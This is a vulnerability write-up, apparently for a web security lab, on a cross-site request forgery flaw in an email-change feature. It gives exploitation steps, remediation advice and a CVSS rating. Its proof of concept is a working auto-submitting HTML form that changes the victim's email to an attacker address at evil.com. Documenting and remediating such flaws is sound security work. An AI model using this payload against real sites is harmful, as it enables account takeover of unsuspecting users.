# CSRF vulnerability with no defenses

## Description
The email change functionality is vulnerable to Cross-Site Request Forgery (CSRF). The application accepts state-changing POST requests without validating a CSRF token and lacks additional protections such as SameSite cookies, allowing attackers to perform unauthorized actions on behalf of authenticated users.

## Steps to Exploit
1. Log in and observe the email change request using Burp Suite.
2. Confirm that no CSRF token is present in the request.
3. Create a malicious HTML page containing an auto-submitting form targeting the email change endpoint.
4. Set the form action to the email change URL.
5. Include an attacker-controlled email address as a hidden parameter.
6. Host the page on an attacker-controlled website.
7. When an authenticated victim visits the page, their email address is changed without their knowledge.

## Proof of Concept

### Malicious HTML Page
```html
<html>
<body onload="document.forms[0].submit()">
<form action="https://TARGET/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.com">
</form>
</body>
</html>
```

## Impact
- Unauthorized modification of a user's email address.
- Potential account takeover through password reset functionality.
- Loss of account integrity and user trust.
- Unauthorized actions performed on behalf of authenticated users.

## Remediation
1. Implement CSRF protection tokens for all state-changing requests.
2. Configure session cookies with `SameSite=Strict` or `SameSite=Lax`.
3. Validate the `Origin` and `Referer` headers on sensitive requests.
4. Require password confirmation for critical account changes.

## CVSS Score
**CVSS v3.1: 6.5 (Medium)**

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`

## CVSS Justification
- **Attack Vector:** Network – delivered through a malicious webpage or link.
- **Attack Complexity:** Low – requires a crafted HTML form.
- **Privileges Required:** None.
- **User Interaction:** Required – the victim must visit the attacker-controlled page.
- **Confidentiality:** None – no direct disclosure of sensitive information.
- **Integrity:** High – attackers can modify account settings and potentially gain account control.
- **Availability:** None – no impact on service availability.